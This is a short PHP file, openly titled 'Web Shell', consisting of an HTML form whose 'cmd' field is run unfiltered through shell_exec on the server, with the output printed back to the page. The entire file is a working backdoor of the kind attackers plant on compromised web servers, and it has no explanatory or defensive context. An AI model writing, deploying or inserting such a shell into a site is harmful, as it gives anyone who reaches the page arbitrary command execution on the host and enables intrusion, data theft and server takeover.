<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cmd = $_POST['cmd'] ?? '';
    $output = shell_exec($cmd);
}
?>
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Web Shell</title></head>
<body>
    <form method="post">
        <input type="text" name="cmd" size="60" autofocus>
        <input type="submit" value="実行">
    </form>
    <pre><?php if (isset($output)) echo htmlspecialchars($output); ?></pre>
</body>
</html>
